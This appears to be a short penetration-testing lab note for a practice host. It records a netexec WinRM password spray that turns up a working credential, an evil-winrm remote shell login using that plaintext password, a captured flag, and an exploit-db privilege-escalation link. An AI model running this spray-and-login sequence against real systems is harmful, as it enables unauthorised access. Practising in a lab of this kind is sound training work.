

## Steps taken: .112

```bash

# port 80
# Fuzzed and found 
http://192.168.144.112/backend/api/v2/users/dev

# Run netexec
netexec winrm 192.168.144.112 -u info/.112/usernames.txt -p info/.112/passwords.txt
	WINRM       192.168.144.112 5985   OSCP             [+] oscp\jay:Beginnin24Of4End81 (Pwn3d!)
	
# use evil-winrm
evil-winrm -i 192.168.144.112 -u jay -p 'Beginnin24Of4End81'

# local.txt
C:\Users\jay\desktop> cat local.txt
	55dd0172f48af043e598ae0c82ee6c09

# Found PE exploit
https://www.exploit-db.com/exploits/49530

# Cant exploit cause my shell is shity and medium level.




```




## Screens

![f1fb93739e078eae085be3b2eae50b17.png](../../../_resources/f1fb93739e078eae085be3b2eae50b17.png)